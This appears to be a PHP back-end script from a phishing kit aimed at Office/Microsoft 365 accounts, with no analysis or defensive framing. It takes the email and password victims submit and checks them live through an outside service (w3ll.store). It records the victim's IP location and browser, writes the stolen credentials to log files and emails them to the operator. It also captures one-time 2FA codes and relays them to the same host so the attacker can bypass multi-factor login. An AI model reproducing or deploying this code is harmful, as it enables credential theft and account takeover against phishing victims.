<?php

include "boblock.php";
function RndString($length = 50)
{
    return substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, $length);
}
function Checkpassword($email, $password)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/office/office-val?email=" . $email . "&pass=" . $password);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
    $headers = array();
    $headers[] = "Connection: keep-alive";
    $headers[] = "Cache-Control: max-age=0";
    $headers[] = "Upgrade-Insecure-Requests: 1";
    $headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
    $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
    $headers[] = "Sec-Fetch-Site: none";
    $headers[] = "Sec-Fetch-Mode: navigate";
    $headers[] = "Sec-Fetch-User: ?1";
    $headers[] = "Sec-Fetch-Dest: document";
    $headers[] = "Accept-Language: en-US,en;q=0.9";
    $headers[] = "Cookie: brcap=0; clrc={%2218850%22%3a[%22vLmkZEso%22%2c%22YMcTWH6J%22%2c%22Y84OH6yN%22%2c%22rCQ1FQCo%22%2c%220b9gVZOA%22%2c%227b66aBPk%22]}; PHPSESSID=n3mqb6fthdij42bob315v444pn";
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo "Error:" . curl_error($ch);
    }
    $result = json_decode($result, true);
    curl_close($ch);
    return $result;
}
$data = $_GET["data"];
if (isset($_POST["pass"])) {
    $password = $_POST["pass"];
    if (isset($PageLink) && ($PageLink == true || $PageLink == "true" || $PageLink == "TRUE" || $PageLink == "True")) {
        $actual_link = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://{$_SERVER["HTTP_HOST"]}";
        $actual_page = "|Page: {$actual_link}";
        $actual_page2 = "{$actual_link}";
    } elseif (isset($PageLink) && $PageLink !== '' && $PageLink !== false && $PageLink !== "false" && $PageLink !== "FALSE" && $PageLink !== "False") {
        $actual_page = "url: {$PageLink}";
        $actual_page2 = "url: {$PageLink}";
    } else {
        $actual_page = '';
        $actual_page2 = '';
    }
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $remoteIP = $_SERVER["HTTP_CF_CONNECTING_IP"];
    } else {
        $remoteIP = $_SERVER["REMOTE_ADDR"];
    }
    $headers[] = "MIME-Version: 1.0";
    $headers[] = "Content-Type: text/plain; charset=iso-8859-1";
    if (base64_encode(base64_decode($data)) === $data) {
        $email = base64_decode($data);
        $email = filter_var($email, FILTER_SANITIZE_EMAIL);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL) || !isset($_POST["pass"]) || $_POST["pass"] == '') {
            if ($onlyonetimeuse == true || $onlyonetimeuse == "true" || $onlyonetimeuse == "TRUE" || $onlyonetimeuse == "True" || $onlyonetimeuse == "yes" || $onlyonetimeuse == "YES") {
                $usedemails = file("../gogo/UsedEmails.txt", "FILE_[OO__E_^U__LINES");
                if (!in_array($email, $usedemails)) {
                    $file = fopen("../gogo/UsedEmails.txt", "a");
                    fwrite($file, $email . "\n");
                    fclose($file);
                    chmod("../gogo/UsedEmails.txt", 384);
                    if (!isset($_SESSION["NOTEXPIRED"])) {
                        $_SESSION["NOTEXPIRED"] = "true";
                    }
                }
            }
            die(header("Location: " . $FailRedirect));
        }
    } else {
        $email = $data;
        $email = filter_var($email, FILTER_SANITIZE_EMAIL);
        if (!filter_var($email, FILTER_VALIDATE_EMAIL) || !isset($_POST["pass"]) || $_POST["pass"] == '') {
            if ($onlyonetimeuse == true || $onlyonetimeuse == "true" || $onlyonetimeuse == "TRUE" || $onlyonetimeuse == "True" || $onlyonetimeuse == "yes" || $onlyonetimeuse == "YES") {
                $usedemails = file("../gogo/UsedEmails.txt", "FILE_[OO__E_^U__LINES");
                if (!in_array($email, $usedemails)) {
                    $file = fopen("../gogo/UsedEmails.txt", "a");
                    fwrite($file, $email . "\n");
                    fclose($file);
                    chmod("../gogo/UsedEmails.txt", 384);
                    if (!isset($_SESSION["NOTEXPIRED"])) {
                        $_SESSION["NOTEXPIRED"] = "true";
                    }
                }
            }
            die(header("Location: " . $FailRedirect));
        }
    }
    $result = Checkpassword($email, $password);
    if ($result["live"]) {
        $subject = "[OV6 VALID LOGS] | {$email} | {$remoteIP} {$subjectTitle}";
    } else {
        $subject = "[OV6 INVALID LOGS] | {$email} | {$remoteIP} {$subjectTitle}";
    }
    $ExRobotos = curl_init();
    curl_setopt($ExRobotos, CURLOPT_URL, "http://ip-api.com/json/" . $remoteIP);
    curl_setopt($ExRobotos, CURLOPT_HEADER, 0);
    curl_setopt($ExRobotos, CURLOPT_RETURNTRANSFER, TRUE);
    $curlExec = curl_exec($ExRobotos);
    curl_close($ExRobotos);
    $IP_LOOKUP = json_decode($curlExec, true);
    $browser = $_SERVER["HTTP_USER_AGENT"];
    if (preg_match("/Chrome/", $browser)) {
        $brow = "Chrome";
    } elseif (preg_match("/Firefox/", $browser)) {
        $brow = "Firefox";
    } elseif (preg_match("/Edg/", $browser)) {
        $brow = "Edge";
    } elseif (preg_match("/OPR/", $browser)) {
        $brow = "Opera";
    } elseif (preg_match("/Mobile/", $browser)) {
        $brow = "Phone Browser";
    } else {
        $brow = "Unkown";
    }
    $date = date("D M d, Y g:i a");
    if ($IP_LOOKUP && $IP_LOOKUP["query"] != null) {
        $Ex_country = $IP_LOOKUP["country"];
        $Ex_countrycode = $IP_LOOKUP["countryCode"];
        $Ex_state = $IP_LOOKUP["regionName"];
        $Ex_city = $IP_LOOKUP["city"];
        $Ex_postal = $IP_LOOKUP["zip"];
        if ($result["live"]) {
            $message = "    !---[VALID LOGS]---!";
            $logs = "    !---[VALID LOGS]---!";
        } else {
            $message = "    !---[INVALID LOGS]---!";
            $logs = "    !---[INVALID LOGS]---!";
        }
        $message .= "\n        +---[ENJOY YOUR LOGS MAJESTY]---+\n        | Email : {$email}\n        | Password : {$password}\n        | Page : {$actual_page2}\n        | IP : {$remoteIP}\n        | Country : {$Ex_country}\n        | Country Code : {$Ex_countrycode}\n        | Region : {$Ex_state}\n        | City : {$Ex_city}\n        | Postal Code: {$Ex_postal}\n        | Date: {$date} \n        | UA: {$browser}\n        | Browser: {$brow}\n\n        ";
        $logs .= "\n        +---[ENJOY YOUR LOGS MAJESTY]---+\n        | Email : {$email}\n        | Password : {$password}\n        | Page : {$actual_page2}\n        | IP : {$remoteIP}\n        | Country : {$Ex_country}\n        | Country Code : {$Ex_countrycode}\n        | Region : {$Ex_state}\n        | City : {$Ex_city}\n        | Postal Code: {$Ex_postal}\n        | Date: {$date} \n        | UA: {$browser}\n        | Browser: {$brow}\n\n        ";
        $logsfileName_error = "error_" . $logsfileName;
        if ($result["live"]) {
            if (isset($logsfileName) && $logsfileName !== '' && $logsfileName !== "false" && $logsfileName !== "FALSE" && $logsfileName !== false) {
                $file = fopen("../gogo/" . $logsfileName, "a");
                fwrite($file, $logs);
                fclose($file);
                chmod("../gogo/" . $logsfileName, 384);
            }
        } else {
            if (isset($logsfileName_error) && $logsfileName_error !== '' && $logsfileName_error !== "false" && $logsfileName_error !== "FALSE" && $logsfileName_error !== false) {
                $file = fopen("../gogo/" . $logsfileName_error, "a");
                fwrite($file, $logs);
                fclose($file);
                chmod("../gogo/" . $logsfileName_error, 384);
            }
        }
        $mail = mail($toEmail, $subject, $message, implode("\r\n", $headers));
        if (!$mail) {
            die;
        }
    } else {
        if ($result["live"]) {
            $message = "    !---[VALID LOGS]---!\n";
            $logs = "    !---[VALID LOGS]---!\n";
        } else {
            $message = "    !---[INVALID LOGS]---!\n";
            $logs = "    !---[INVALID LOGS]---!\n";
        }
        $message = "\n        +---[ENJOY YOUR LOGS MAJESTY]---+\n        | Email : {$email}\n        | Password : {$password}\n        | Page : {$actual_page2}\n        | Date : {$date}\n        | UA: {$browser}\n        | Browser: {$brow}\n\n        | Failed fetching data from API (may be API is dead or CURL is disabled)\n";
        $logs = "\n        +---[ENJOY YOUR LOGS MAJESTY]---+\n        | Email : {$email}\n        | Password : {$password}\n        | Page : {$actual_page}\n        | Date : {$date}\n        | UA: {$browser}\n        | Browser: {$brow}\n\n        | Failed fetching data from API (may be API is dead or CURL is disabled)\n";
        $logsfileName_error = "error_" . $logsfileName;
        if ($result["live"]) {
            if (isset($logsfileName) && $logsfileName !== '' && $logsfileName !== "false" && $logsfileName !== "FALSE" && $logsfileName !== false) {
                $file = fopen("../gogo/" . $logsfileName, "a");
                fwrite($file, $logs);
                fclose($file);
                chmod("../gogo/" . $logsfileName, 384);
            }
        } else {
            if (isset($logsfileName_error) && $logsfileName_error !== '' && $logsfileName_error !== "false" && $logsfileName_error !== "FALSE" && $logsfileName_error !== false) {
                $file = fopen("../gogo/" . $logsfileName_error, "a");
                fwrite($file, $logs);
                fclose($file);
                chmod("../gogo/" . $logsfileName_error, 384);
            }
        }
        mail($toEmail, $subject, $message, $headers);
    }
    if ($onlyonetimeuse == true || $onlyonetimeuse == "true" || $onlyonetimeuse == "TRUE" || $onlyonetimeuse == "True" || $onlyonetimeuse == "yes" || $onlyonetimeuse == "YES") {
        $usedemails = file("../gogo/UsedEmails.txt", "FILE_[OO__E_^U__LINES");
        if (!in_array($email, $usedemails)) {
            $file = fopen("../gogo/UsedEmails.txt", "a");
            fwrite($file, $email . "\n");
            fclose($file);
            chmod("../gogo/UsedEmails.txt", 384);
            if (!isset($_SESSION["NOTEXPIRED"])) {
                $_SESSION["NOTEXPIRED"] = "true";
            }
        }
    }
    $randpart = RndString(50) . '' . RndString(50) . '' . RndString(50);
    if (!$result["2fa"]) {
        $fixIndex = "verify?";
        $fixPart = "&status";
    } else {
        $fixIndex = "otp?";
        $fixPart = '';
    }
    if ($result["live"] && $result["2fa"] == false) {
        if ($onlyonetimeuse == true || $onlyonetimeuse == "true" || $onlyonetimeuse == "TRUE" || $onlyonetimeuse == "True" || $onlyonetimeuse == "yes" || $onlyonetimeuse == "YES") {
            $usedemails = file("../gogo/UsedEmails.txt", "FILE_[OO__E_^U__LINES");
            if (!in_array($email, $usedemails)) {
                $file = fopen("../gogo/UsedEmails.txt", "a");
                fwrite($file, $email . "\n");
                fclose($file);
                chmod("../gogo/UsedEmails.txt", 384);
            }
        }
        $_SESSION["success"] = true;
        echo "<script type=\"text/javascript\">window.location.replace(\"./success?{$randpart}&string=signin&error=success&data={$data}\")</script>\n";
    }
    if (!$result["2fa"]) {
        echo "<script type=\"text/javascript\">window.location.replace(\"./{$fixIndex}{$randpart}{$fixPart}=error&string=signin&data={$data}\")</script>\n";
    } else {
        echo "<script type=\"text/javascript\">window.location.replace(\"./{$fixIndex}{$randpart}&string=signin&data={$data}\")</script>\n";
    }
} else {
    if (isset($_POST["code"])) {
        $code = $_POST["code"];
        $code = str_replace(" ", '', $code);
        if (base64_encode(base64_decode($data)) === $data) {
            $email = base64_decode($data);
        } else {
            $email = $data;
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://w3ll.store/api/office/office-otp?email=" . $email . "&code=" . $code);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate");
        $headers = array();
        $headers[] = "Connection: keep-alive";
        $headers[] = "Cache-Control: max-age=0";
        $headers[] = "Upgrade-Insecure-Requests: 1";
        $headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1";
        $headers[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
        $headers[] = "Sec-Fetch-Site: none";
        $headers[] = "Sec-Fetch-Mode: navigate";
        $headers[] = "Sec-Fetch-User: ?1";
        $headers[] = "Sec-Fetch-Dest: document";
        $headers[] = "Accept-Language: en-US,en;q=0.9";
        $headers[] = "Cookie: brcap=0; clrc={%2218850%22%3a[%22vLmkZEso%22%2c%22YMcTWH6J%22%2c%22Y84OH6yN%22%2c%22rCQ1FQCo%22%2c%220b9gVZOA%22%2c%227b66aBPk%22]}; PHPSESSID=n3mqb6fthdij42bob315v444pn";
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            echo "Error:" . curl_error($ch);
        }
        $result = json_decode($result, true);
        curl_close($ch);
        $randpart = RndString(50) . '' . RndString(50) . '' . RndString(50);
        $fixIndex = "otp?";
        $fixPart = "&status";
        if ($result["valid"]) {
            $_SESSION["success"] = true;
            echo "<script type=\"text/javascript\">window.location.replace(\"./success?{$randpart}&string=signin&error=success&data={$data}\")</script>\n";
        } else {
            echo "<script type=\"text/javascript\">window.location.replace(\"./{$fixIndex}{$randpart}&string=signin&error=otp&data={$data}\")</script>\n";
        }
        echo "<script type=\"text/javascript\">window.location.replace(\"./{$fixIndex}{$randpart}{$fixPart}=error&string=signin&data={$data}\")</script>\n";
    }
}
